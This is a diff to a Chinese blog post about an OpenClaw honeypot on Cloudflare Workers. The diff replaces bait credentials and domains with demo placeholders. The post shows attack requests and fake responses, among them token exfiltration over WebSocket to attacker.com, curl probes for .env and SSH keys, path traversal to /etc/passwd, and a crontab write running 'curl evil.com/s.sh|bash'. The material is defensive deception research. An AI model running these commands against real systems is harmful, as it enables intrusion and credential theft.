@@ -1,6 +1,6 @@
 # 我用 Cloudflare Workers 搭了一个 OpenClaw 蜜罐
 
-> 部署地址：claw.hxorz.com
+> 部署地址：gateway.example.com
 
 ---
 
@@ -29,7 +29,7 @@
 
 ## 蜜罐长什么样
 
-访问 `claw.hxorz.com` 看到的是一个完整的 OpenClaw v2026.3.12 控制台，有7个标签页：
+访问 `gateway.example.com` 看到的是一个完整的 OpenClaw v2026.3.12 控制台，有7个标签页：
 
 | 标签 | 内容 |
 |---|---|
@@ -105,13 +105,13 @@ CVE-2026-25253 是其中最值得说的。真实漏洞是：OpenClaw 控制台�
 蜜罐的实现是这样的——访问 `/?gatewayUrl=http://attacker.com/collect` 时，返回一个包含这段 JS 的页面：
 
 ```javascript
-var ws = new WebSocket('ws://attacker.com/collect?token=ocgw-Fk4aX9pZ...');
+var ws = new WebSocket('ws://attacker.com/collect?token=ocgw-demo-token...');
 ws.onopen = function(){
   ws.send(JSON.stringify({
     type: 'auth',
-    token: 'ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o',
+    token: 'ocgw-demo-token-not-real',
     version: '2026.3.12',
-    gateway_id: 'ocgw-vps-prod-01'
+    gateway_id: 'demo-gateway-01'
   }));
 };
 // 如果 WebSocket 失败，fallback 到 fetch POST
@@ -150,24 +150,21 @@ Disallow: /webhooks/
 ### 敏感文件探测
 
 ```bash
-$ curl https://claw.hxorz.com/.env
+$ curl https://gateway.example.com/.env
 
 SHELL=/bin/bash
-ANTHROPIC_API_KEY=sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8
-OPENAI_API_KEY=sk-proj-Gh7mK2pL9nQ4rT6vX8wY0zA3bC5dE1fJ-KmNpQrStUvWxYz
-OPENCLAW_GATEWAY_TOKEN=ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o
-DB_HOST=10.2.1.100
-DB_PASSWORD=Db@P4ss2026!
-REDIS_PASSWORD=R3d1s2026!
+ANTHROPIC_API_KEY=sk-ant-example-not-a-real-key
+OPENAI_API_KEY=sk-proj-example-not-a-real-key
+OPENCLAW_GATEWAY_TOKEN=ocgw-demo-token-not-real
+DB_HOST=db.internal.example
+DB_PASSWORD=demo-db-password
+REDIS_PASSWORD=demo-redis-password
 ```
 
 ```bash
-$ curl https://claw.hxorz.com/.ssh/id_rsa
+$ curl https://gateway.example.com/.ssh/id_rsa
 
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAARGVmYXVsdAAAABAAAAAGc3NoLXJzYQAAA
-...
------END OPENSSH PRIVATE KEY-----
+DEMO_PRIVATE_KEY_START_NOT_REAL\nDEMO-KEY-MATERIAL-NOT-REAL\nDEMO_PRIVATE_KEY_END_NOT_REAL
 ```
 
 拿到这些"凭证"之后，攻击者通常会去尝试连数据库、调 Anthropic API、SSH 进内网，每一步都还是陷阱。
@@ -175,7 +172,7 @@ b3BlbnNzaC1rZXktdjEAAAAARGVmYXVsdAAAABAAAAAGc3NoLXJzYQAAA
 ### Shell 执行
 
 ```bash
-$ curl -X POST https://claw.hxorz.com/api/v1/shell/execute \
+$ curl -X POST https://gateway.example.com/api/v1/shell/execute \
   -H "Content-Type: application/json" \
   -d '{"cmd":"cat /root/.openclaw/openclaw.json"}'
 
@@ -187,19 +184,19 @@ $ curl -X POST https://claw.hxorz.com/api/v1/shell/execute \
 ```
 
 ```bash
-$ curl -X POST https://claw.hxorz.com/api/v1/shell/execute \
+$ curl -X POST https://gateway.example.com/api/v1/shell/execute \
   -d '{"cmd":"docker inspect openclaw_gateway"}'
 
 "Env": [
-  "ANTHROPIC_API_KEY=sk-ant-api03-Fk4aX9pZ...",
-  "OPENCLAW_GATEWAY_TOKEN=ocgw-Fk4aX9pZ..."
+  "ANTHROPIC_API_KEY=sk-ant-example...",
+  "OPENCLAW_GATEWAY_TOKEN=ocgw-demo-token..."
 ]
 ```
 
 ### CVE-2026-28464 路径穿越
 
 ```bash
-$ curl "https://claw.hxorz.com/api/v1/sessions?sessionId=../../etc/passwd"
+$ curl "https://gateway.example.com/api/v1/sessions?sessionId=../../etc/passwd"
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -209,7 +206,7 @@ openclaw:x:1000:1000:OpenClaw User:/home/openclaw:/bin/bash
 ### CVE-2026-32060 apply_patch 任意写
 
 ```bash
-$ curl -X POST https://claw.hxorz.com/api/v1/agent/apply_patch \
+$ curl -X POST https://gateway.example.com/api/v1/agent/apply_patch \
   -d '{"path":"../../../etc/crontab","content":"* * * * * curl evil.com/s.sh|bash"}'
 
 {
@@ -226,14 +223,14 @@ $ curl -X POST https://claw.hxorz.com/api/v1/agent/apply_patch \
 ### Agent Memory 导出
 
 ```bash
-$ curl https://claw.hxorz.com/api/v1/agent/memory/export
+$ curl https://gateway.example.com/api/v1/agent/memory/export
 
 {
   "memory": [
     {"type":"credential","content":"ANTHROPIC_API_KEY=sk-ant-api03-..."},
-    {"type":"credential","content":"DB_PASSWORD=Db@P4ss2026!  DB_HOST=10.2.1.100"},
-    {"type":"credential","content":"REDIS_PASSWORD=R3d1s2026!"},
-    {"type":"context","content":"User is CEO, company bank: Chase routing=021000021 acct=4829..."}
+    {"type":"credential","content":"DB_PASSWORD=demo-db-password  DB_HOST=db.internal.example"},
+    {"type":"credential","content":"REDIS_PASSWORD=demo-redis-password"},
+    {"type":"context","content":"Synthetic billing profile: routing=000000000 account=DEMO-ACCOUNT-NOT-REAL"}
   ]
 }
 ```
@@ -311,8 +308,8 @@ https://your-domain.com/admin
 
 代码已开源，含完整部署文档：
 
-**[https://github.com/inwpu/openclaw-Honey-Pot](https://github.com/inwpu/openclaw-Honey-Pot)**
+**[https://github.com/stephenlzc/workers-honeypot](https://github.com/stephenlzc/workers-honeypot)**
 
 ---
 
-*部署地址：claw.hxorz.com*
+*部署地址：gateway.example.com*
